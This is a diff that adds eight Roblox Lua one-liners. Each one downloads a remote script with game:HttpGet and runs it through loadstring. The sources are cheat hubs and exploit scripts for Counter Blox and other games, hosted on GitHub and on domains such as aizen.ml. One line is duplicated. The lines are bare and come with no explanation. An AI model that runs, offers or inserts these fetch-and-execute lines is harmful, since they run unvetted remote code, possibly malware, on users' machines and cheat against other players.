@@ -1,0 +1,8 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/cbremas", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/cb-r-script/main/Protected%20(21).lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/anim9r/BloxFun/main/AutoUpdate.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/CounterBlox.lua", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/CounterBlox.lua", true))();
+loadstring(game:HttpGet("https://aizen.ml/TopSecret/5.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
+loadstring(game:HttpGet("https://suckii.keshsenpai.com/.lua"))();
